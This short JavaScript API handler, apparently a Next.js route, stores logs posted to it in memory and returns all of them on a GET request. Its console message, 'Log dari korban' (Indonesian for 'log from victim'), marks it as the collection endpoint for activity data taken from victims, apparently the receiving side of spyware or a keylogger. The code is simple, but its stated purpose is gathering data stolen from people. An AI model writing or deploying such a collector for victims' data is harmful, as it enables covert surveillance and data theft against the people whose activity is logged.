let activityLogs = [];

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { log } = req.body;
    activityLogs.push(log);
    console.log('Log dari korban:', log);
    res.status(200).json({ received: true });
  } else if (req.method === 'GET') {
    res.status(200).json({ logs: activityLogs });
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
